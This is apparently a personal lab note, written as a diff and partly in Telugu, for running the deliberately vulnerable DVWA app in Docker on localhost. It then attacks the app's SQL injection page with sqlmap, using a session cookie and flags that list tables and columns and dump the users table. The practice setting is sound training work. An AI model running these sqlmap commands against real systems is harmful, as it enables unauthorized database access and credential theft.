@@ -1,0 +1,22 @@
+sudo systemctl enable docker --now 
+sudo usermod -aG docker $USER
+
+restart
+
+newgrp docker
+docker run --rm -it -p 80:80 vulnerables/web-dvwa     on chesi firefox run chey
+
+now go to firefox : 127.0.0.1 it goes to dvwa
+credentials : admin password
+
+down ki velli reset kotti malli credentials type cheyi
+
+go to sql injection ->  
+
+windows -> search for sqlmap -> run 
+
+new terminal - > sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/?id=234&Submit=Submit" --cookie="PHPSESSID=2gciikrscjt4o7dabce6gnnlm1; security=low" --tables
+
+--schema --batch
+--columns -T users --batch
+--dump -T users --batch
